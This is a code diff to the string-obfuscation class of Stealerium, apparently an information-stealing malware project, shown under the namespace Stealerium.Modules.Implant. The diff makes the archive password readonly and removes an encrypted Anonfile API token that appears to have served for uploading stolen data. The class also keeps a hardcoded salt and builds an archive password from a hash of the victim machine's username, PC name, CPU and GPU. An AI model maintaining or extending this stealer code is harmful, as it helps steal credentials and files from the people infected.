@@ -10,7 +10,7 @@ namespace Stealerium.Modules.Implant
     internal sealed class StringsCrypt
     {
         // Salt
-        public static string ArchivePassword = GenerateRandomData();
+        public static readonly string ArchivePassword = GenerateRandomData();
 
         // byte[] SaltBytes = Encoding.Default.GetBytes("f3o3K-11=G-N7VJtozOWRr=(tNZBfK+bS7Fy");
         private static readonly byte[] SaltBytes =
@@ -25,14 +25,6 @@ namespace Stealerium.Modules.Implant
             59, 38, 75, 70, 33, 77, 33, 104, 56, 94, 105, 84, 58, 60, 41, 97, 63, 126, 109, 88, 101, 78, 42, 126, 111,
             63, 103, 78, 91, 118, 64, 114, 81, 61, 66
         };
-
-        //Anonfile API key
-        // byte[] CryptKey = Encoding.Default.GetBytes("?token=0429cbf2316b8e33");
-        public static string AnonApiToken = Decrypt(new byte[]
-        {
-            240, 69, 91, 47, 188, 54, 254, 184, 162, 97, 18, 252, 143, 255, 136, 205, 102, 226, 235, 10, 49, 114, 229,
-            124, 201, 6, 163, 171, 240, 62, 178, 215
-        });
 
         // Create hash from username, pcname, cpu, gpu
         public static string GenerateRandomData(string sd = "0")
